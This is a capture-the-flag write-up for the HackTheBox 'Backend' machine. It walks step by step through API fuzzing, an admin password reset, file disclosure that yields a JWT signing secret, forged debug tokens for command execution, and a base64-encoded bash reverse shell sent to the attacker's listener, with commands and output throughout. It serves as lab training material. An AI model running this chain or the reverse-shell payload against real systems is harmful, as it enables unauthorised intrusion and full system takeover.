---
layout: post
title: HTB Backend Writeup  
subtitle: Medium Box
thumbnail-img: /assets/img/backend/backend.png
tags: [HTB]
---
![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/backend.png)


| Name | Explore |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 12 Apr 2022 |
| DIFFICULTY | Medium |

# Port Scan
IP: 10.10.11.161
```
nmap -p 22,80 -oN script.nmap -sVC 10.10.11.161 

PORT   STATE SERVICE VERSION                                                                                                                                                         [34/259]
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)                                                                                                            
| ssh-hostkey:                                                                                
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)                                
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)                               
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)                             
80/tcp open  http    uvicorn                                                                  
| fingerprint-strings:                                                                                                                                                                       
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:                                                                
|     HTTP/1.1 400 Bad Request                                                                
|     content-type: text/plain; charset=utf-8                                                 
|     Connection: close                                                                       
|     Invalid HTTP request received.                                                          
|   FourOhFourRequest:                                                                        
|     HTTP/1.1 404 Not Found                                                                  
|     date: Fri, 15 Apr 2022 07:12:31 GMT                                                     
|     server: uvicorn                                                                         
|     content-length: 22                                                                      
|     content-type: application/json                                                          
|     Connection: close                                                                                                                                                                      
|     {"detail":"Not Found"}                                                                  
|   GetRequest:                                                                               
|     HTTP/1.1 200 OK                                                                         
|     date: Fri, 15 Apr 2022 07:12:20 GMT                                                     
|     server: uvicorn                                                                                                                                                                        
|     content-length: 29                                                                      
|     content-type: application/json                                                                                                                                                         
|     Connection: close                                                                       
|     {"msg":"UHC API Version 1.0"}                                                           
|   HTTPOptions:                                                                              
|     HTTP/1.1 405 Method Not Allowed                                                         
|     date: Fri, 15 Apr 2022 07:12:26 GMT                                                                                                                                                    
|     server: uvicorn                                                                         
|     content-length: 31                       
|     content-type: application/json                                                                                                                                                         
|     Connection: close                                                                                                                                                                      
|_    {"detail":"Method Not Allowed"}                                                         
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: uvicorn

```

# 80 HTTP
The server header shows that this is a `uvicorn` application. A quick google search teaches us that it is a ASGI (Asynchronous Server Gateway Interface) web server written in python. `nmap` identifies that this server is returning a content type of `content-type: application/json` meaning that this is probably a web API.

Taking a look at the webpage it returns `UHC API Version 1.0`

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/659ae39f917e463fb2c0677d60d4a23d.png)

## Fuzzing The API
There are a few tools that we can use to fuzz this API but first, we have to have an endpoint to attack. `ffuf` is a great tool to fuzz out files and directories from a webserver.

```
┌──(kali㉿kali)-[~/htb/backend]
└─$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://10.10.11.161/FUZZ -c  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.161/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

docs                    [Status: 401, Size: 30, Words: 2, Lines: 1]
api                     [Status: 200, Size: 20, Words: 1, Lines: 1]
```

We learn of `/api` and going there returns an endpoint of `v1`, so next, we will try `/api/v1`. This gives us two more endpoints, `user` and `admin`. On `/api/v1/admin` we get a response code of 307 Temporary Redirect and "Not authenticated", on `/api/v1/user` we get 404 "Not Found". 

```
┌──(kali㉿kali)-[~/htb/backend]
└─$ curl -i -s -k -X $'GET' \
    -H $'Host: 10.10.11.161' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://10.10.11.161/api/v1/user'
HTTP/1.1 404 Not Found
date: Fri, 15 Apr 2022 19:53:04 GMT
server: uvicorn
content-length: 22
content-type: application/json
Connection: close

{"detail":"Not Found"}                                                                                                                                                                                             
┌──(kali㉿kali)-[~/htb/backend]
└─$ curl -i -s -k -X $'GET' \
    -H $'Host: 10.10.11.161' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://10.10.11.161/api/v1/admin'
HTTP/1.1 307 Temporary Redirect
date: Fri, 15 Apr 2022 19:53:19 GMT
server: uvicorn
location: http://10.10.11.161/api/v1/admin/
Transfer-Encoding: chunked
Connection: close
```

We now have two endpoints that we can now try to fuzz. While trying to fuzz some parameters, `GET` was not yielding any results. After changing the method to `POST` we can see three more endpoints. 

```
┌──(kali㉿kali)-[~/htb/backend]
└─$ ffuf -X POST -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.161/api/v1/user/FUZZ -c -fc 404,405 -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.11.161/api/v1/user/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404,405
________________________________________________

cgi-bin/                [Status: 307, Size: 0, Words: 1, Lines: 1]
login                   [Status: 422, Size: 172, Words: 3, Lines: 1]
signup                  [Status: 422, Size: 81, Words: 2, Lines: 1]
:: Progress: [4711/4711] :: Job [1/1] :: 213 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

We can take a look at the response from `/api/v1/user/signup` in burp

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/82e24c42e07c45e9b4c2fc8258dc13ef.png)

The response is telling us that we are missing a `field` value. We can add some json data to post and change the `Content-Type` to `application/json` because that seems to be what this python web server is using.

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/c88a43631d224c3ea58394147bc0f646.png)

We now have a new error saying we are missing an email and password field. We will update our request with an email and password and once we send it we get a `201 Created`

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/09789eb20312492981c322e074cc4889.png)

If we remember back to our `ffuf` results there was a `/login` endpoint. Let's try our newly created account. But as we can see it does not work

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/3586ae72a16a482bae339ddef427ff76.png)

There is a chance this endpoint wants the Content-Type to be `application/x-www-form-urlencoded`. So let's try sending our login via that. 

We get a `200` OK and a `access_token`

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/32edb4b165944a17ab5d62945ecdf525.png)

Let's try to use this token on `10.10.11.161/docs` and add the `Authorization: bearer` header

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/36ba2e81eeb7444dbe12ffd4a9d617b9.png)

For some reason burp got stuck on "waiting" and I never got a response.

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/3bafb089d7df4066bbf88c4ca3c8b182.png)

I had to install a firefox plugin called [simple-modify-headers](simple-modify-headers). I had to play around with this for a little bit but here is the configuration I used
- Url Patterns* :  `http://10.10.11.161/*`
- Action `Add`
- Header Field Name `Authorization`
-  Header Field Value `bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNzQ4NTQ2LCJpYXQiOjE2NTAwNTczNDYsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiYTA5MjBkM2EtMDA1Mi00YmFhLWFmZDgtMDAzYmRjYzgzMjRlIn0.zB8A3ObSZPuaDqdf9X2kdGcRjzIIJiSWl2IX_40zNIQ`
-  Comment `t`
-  Apply on `Request`

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/ade7bab491164f84a4babf70cf922970.png)

Once that is all configured go to `/http://10.10.11.161/docs` and we are brought to the "FastAPI" documentation page

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/e1056424ca76469f9f22eba262089ef6.png)

### Burp Fix
I was able to get burp to work but I had to have 2 enters after the last character of the JWT token

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/ef4b204376d942829b938aca713c4db5.png)

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/410abb63a0ad4e09bf1729e6afdc0b36.png)

# User Flag
Reading the documentation there is an API endpoint to get the user flag. It requires the `PUT`  method 
```
┌──(kali㉿kali)-[~/htb]
└─$ curl http://10.10.11.161/api/v1/user/SecretFlagEndpoint -X PUT
{"user.txt":"be79b4a8c3f49e41a6026bd81439bb38"}    
```

 # User Shell
 Reading more of the documentation there is an api function to get information about a user. We can try and put in a `user_id` of 1. Its returns some information about the admin user including the `guid`
 
```
┌──(kali㉿kali)-[~/htb]
└─$ curl http://10.10.11.161/api/v1/user/1                        
{"guid":"36c2e94a-4271-4259-93bf-c96ad5948284","email":"admin@htb.local","date":null,"time_created":1649533388111,"is_superuser":true,"id":1}  
```
 
 There is a `updatepass` function that we can try and use to update the admin's password now that we have the users `guid`. The response is a little bit messy but we get the super users hash and have updated the password
 
 ```
 ┌──(kali㉿kali)-[~/htb]
└─$ curl -X POST -d '{ "guid": "36c2e94a-4271-4259-93bf-c96ad5948284", "password": "password"}' -H 'Content-Type: application/json'  http://10.10.11.161/api/v1/user/updatepass
{"date":null,"id":1,"is_superuser":true,"hashed_password":"$2b$12$u6wAJHW5s0wWvC2Cwv1GhOsWDP33Gd4DGcYm4OjcC71HgeTADmlLm","guid":"36c2e94a-4271-4259-93bf-c96ad5948284","email":"admin@htb.local","time_created":1649533388111,"last_update":null}    
 ```
 
 After trying the new password we get in as the superuser!
 
 ![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/10fcea572d4645eb9c98c7bde40ad31c.png)
 
 ![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/63d023e48b69457495d2429a4469f6ff.png)
 
 Let's grab the JWT token for this admin user
 
 ```
 ┌──(kali㉿kali)-[~/htb]
└─$ curl -X POST -d "username=admin%40htb.local&password=password" -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.161/api/v1/user/login
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNzUzNjk2LCJpYXQiOjE2NTAwNjI0OTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.4EsnOsihmJTkzdPEPZEA78jHNXEkZ89UBUXMIf2wT_E","token_type":"bearer"} 
 ```
 
 Let's try and run commands using the `exec` feature.
 ```
 ┌──(kali㉿kali)-[~/htb]
└─$ curl -X GET http://10.10.11.161/api/v1/admin/exec/id -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNzUzNjk2LCJpYXQiOjE2NTAwNjI0OTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.4EsnOsihmJTkzdPEPZEA78jHNXEkZ89UBUXMIf2wT_E" 
{"detail":"Debug key missing from JWT"}   
 ```
 
  We cant run any commands because we are missing the debug key. Lets see if we can hunt for it using the `/api/v1/admin/file` endpoint.
  
The first file we can look at is `/self/proc/environ`. This is a common file to look at when an LFI is present. This file contains lots of environment variables. From this file, we can see that `/home/htb/uhc/app/main.py` is the config file for this webserver
 ```
┌──(kali㉿kali)-[~/htb]
└─$ curl -X POST http://10.10.11.161/api/v1/admin/file -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNzUzNjk2LCJpYXQiOjE2NTAwNjI0OTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.4EsnOsihmJTkzdPEPZEA78jHNXEkZ89UBUXMIf2wT_E" -H 'Content-Type: application/json' -d '{"file": "/proc/self/environ"}'
{"file":"APP_MODULE=app.main:app\u0000PWD=/home/htb/uhc\u0000LOGNAME=htb\u0000PORT=80\u0000HOME=/home/htb\u0000LANG=C.UTF-8\u0000VIRTUAL_ENV=/home/htb/uhc/.venv\u0000INVOCATION_ID=2d037c2c7fe6474bb3f0e6daf985ec81\u0000HOST=0.0.0.0\u0000USER=htb\u0000SHLVL=0\u0000PS1=(.venv) \u0000JOURNAL_STREAM=9:18235\u0000PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000OLDPWD=/\u0000"}                                                                       
 ```
 
 This output is super messy and we could go clean it up but there is an import `app.core.config` that stuck out. Let's see what is inside
```
┌──(kali㉿kali)-[~/htb]
└─$ curl -X POST http://10.10.11.161/api/v1/admin/file -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNzUzNjk2LCJpYXQiOjE2NTAwNjI0OTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.4EsnOsihmJTkzdPEPZEA78jHNXEkZ89UBUXMIf2wT_E" -H 'Content-Type: application/json' -d '{"file": "/home/htb/uhc/app/main.py"}'
{"file":"import asyncio\n\nfrom fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends\nfrom fastapi_contrib.common.responses import UJSONResponse\nfrom fastapi import FastAPI, Depends, HTTPException, status\nfrom fastapi.security import HTTPBasic, HTTPBasicCredentials\nfrom fastapi.openapi.docs import get_swagger_ui_html\nfrom fastapi.openapi.utils import get_openapi\n\n\n\nfrom typing import Optional, Any\nfrom pathlib import Path\nfrom sqlalchemy.orm import Session\n\n\n\nfrom app.schemas.user import User\nfrom app.api.v1.api import api_router\nfrom app.core.config import settings\n\nfrom app import deps\nfrom app import crud\n\n\napp = FastAPI(title=\"UHC API Quals\", openapi_url=None, docs_url=None, redoc_url=None)\nroot_router = APIRouter(default_response_class=UJSONResponse)\n\n\n@app.get(\"/\", status_code=200)\ndef root():\n    \"\"\"\n    Root GET\n    \"\"\"\n    return {\"msg\": \"UHC API Version 1.0\"}\n\n\n@app.get(\"/api\", status_code=200)\ndef list_versions():\n    \"\"\"\n    Versions\n    \"\"\"\n    return {\"endpoints\":[\"v1\"]}\n\n\n@app.get(\"/api/v1\", status_code=200)\ndef list_endpoints_v1():\n    \"\"\"\n    Version 1 Endpoints\n    \"\"\"\n    return {\"endpoints\":[\"user\", \"admin\"]}\n\n\n@app.get(\"/docs\")\nasync def get_documentation(\n    current_user: User = Depends(deps.parse_token)\n    ):\n    return get_swagger_ui_html(openapi_url=\"/openapi.json\", title=\"docs\")\n\n@app.get(\"/openapi.json\")\nasync def openapi(\n    current_user: User = Depends(deps.parse_token)\n):\n    return get_openapi(title = \"FastAPI\", version=\"0.1.0\", routes=app.routes)\n\napp.include_router(api_router, prefix=settings.API_V1_STR)\napp.include_router(root_router)\n\ndef start():\n    import uvicorn\n\n    uvicorn.run(app, host=\"0.0.0.0\", port=8001, log_level=\"debug\")\n\nif __name__ == \"__main__\":\n    # Use this for debugging purposes only\n    import uvicorn\n\n    uvicorn.run(app, host=\"0.0.0.0\", port=8001, log_level=\"debug\")\n"} 
```

Again really messy output, but we can see the `JWT_SECRET`! `SuperSecretSigningKey-HTB`
```
┌──(kali㉿kali)-[~/htb]
└─$ curl -X POST http://10.10.11.161/api/v1/admin/file -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNzUzNjk2LCJpYXQiOjE2NTAwNjI0OTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.4EsnOsihmJTkzdPEPZEA78jHNXEkZ89UBUXMIf2wT_E" -H 'Content-Type: application/json' -d '{"file": "/home/htb/uhc/app/core/config.py"}'
{"file":"from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator\nfrom typing import List, Optional, Union\n\nfrom enum import Enum\n\n\nclass Settings(BaseSettings):\n    API_V1_STR: str = \"/api/v1\"\n    JWT_SECRET: str = \"SuperSecretSigningKey-HTB\"\n    ALGORITHM: str = \"HS256\"\n\n    # 60 minutes * 24 hours * 8 days = 8 days\n    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8\n\n    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins\n    # e.g: '[\"http://localhost\", \"http://localhost:4200\", \"http://localhost:3000\", \\\n    # \"http://localhost:8080\", \"http://local.dockertoolbox.tiangolo.com\"]'\n    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []\n\n    @validator(\"BACKEND_CORS_ORIGINS\", pre=True)\n    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:\n        if isinstance(v, str) and not v.startswith(\"[\"):\n            return [i.strip() for i in v.split(\",\")]\n        elif isinstance(v, (list, str)):\n            return v\n        raise ValueError(v)\n\n    SQLALCHEMY_DATABASE_URI: Optional[str] = \"sqlite:///uhc.db\"\n    FIRST_SUPERUSER: EmailStr = \"root@ippsec.rocks\"    \n\n    class Config:\n        case_sensitive = True\n \n\nsettings = Settings()\n"}   
```

Let's use that key to give us the Debug flag on our token

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/e4d44e96449141ce9c0c8abd80c03d88.png)

Copy-paste that token and let's run our `id` command again
```
┌──(kali㉿kali)-[~/htb]
└─$ curl -X GET http://10.10.11.161/api/v1/admin/exec/id -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNzUzNjk2LCJpYXQiOjE2NTAwNjI0OTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImRlYnVnIjoidHJ1ZSIsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.PKQzWOcfezwMeLYrNa01u391xYQ7kAeY9E7fknnfPDQ"
"uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)" 
```

Let's get a shell by base64 encoding a basic reverse shell. (we have to base64 encode to escape the "/" on the endpoint). I learned that we need an alphanumeric payload for this to work. In the first example, we have `+` and `=` in our payload and this will break in the url. So just add an extra space or two in the string

```
┌──(kali㉿kali)-[~/htb]
└─$ echo -n "bash -i >& /dev/tcp/10.10.14.2/4242 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQyNDIgMD4mMQ==

┌──(kali㉿kali)-[~/htb]
└─$ echo -n 'bash  -i  >&  /dev/tcp/10.10.14.2/4242   0>&1   ' | base64
YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC4yLzQyNDIgICAwPiYxICAg
```

Then URL encode the payload and send it! I encoded it in burp

![Backend](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/backend/9bf69a9682f74f8b97c519c889d1e562.png)

```
┌──(kali㉿kali)-[~/htb]
└─$ curl -X GET http://10.10.11.161/api/v1/admin/exec/%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%67%4c%57%6b%67%49%44%34%6d%49%43%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%79%4c%7a%51%79%4e%44%49%67%49%43%41%77%50%69%59%78%49%43%41%67%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68 -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNzUzNjk2LCJpYXQiOjE2NTAwNjI0OTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImRlYnVnIjoidHJ1ZSIsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.PKQzWOcfezwMeLYrNa01u391xYQ7kAeY9E7fknnfPDQ"

───────────────────────────────────────────────────────────────────────────────────────────────
                                                                                           
┌──(kali㉿kali)-[~/htb]
└─$ nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.161] 43962
bash: cannot set terminal process group (672): Inappropriate ioctl for device
bash: no job control in this shell
htb@Backend:~/uhc$ 
```

# Root
In the first directory, we get dropped into there is an `auth.log` and inside the file was what looks like a password. Sometimes users put their password into the username.
```
htb@Backend:~/uhc$ cat auth.log
cat auth.log
04/15/2022, 19:49:12 - Login Success for admin@htb.local
04/15/2022, 19:52:32 - Login Success for admin@htb.local
04/15/2022, 20:05:52 - Login Success for admin@htb.local
04/15/2022, 20:09:12 - Login Success for admin@htb.local
04/15/2022, 20:14:12 - Login Success for admin@htb.local
04/15/2022, 20:17:32 - Login Success for admin@htb.local
04/15/2022, 20:30:52 - Login Success for admin@htb.local
04/15/2022, 20:39:12 - Login Success for admin@htb.local
04/15/2022, 20:40:52 - Login Success for admin@htb.local
04/15/2022, 20:47:32 - Login Success for admin@htb.local
04/15/2022, 20:55:52 - Login Failure for Tr0ub4dor&3
04/15/2022, 20:57:27 - Login Success for admin@htb.local
04/15/2022, 20:57:32 - Login Success for admin@htb.local
04/15/2022, 20:57:52 - Login Success for admin@htb.local
04/15/2022, 20:59:12 - Login Success for admin@htb.local
04/15/2022, 21:04:12 - Login Success for admin@htb.local
04/15/2022, 21:10:52 - Login Success for admin@htb.local
04/15/2022, 21:15:46 - Login Success for zon@rocks.rocks
04/15/2022, 22:33:45 - Login Success for admin@htb.local
04/15/2022, 22:38:49 - Login Success for admin@htb.local
```

Giving it a try we get root!
```
htb@Backend:~/uhc$ su -
su -
Password: Tr0ub4dor&3
id
uid=0(root) gid=0(root) groups=0(root)
```
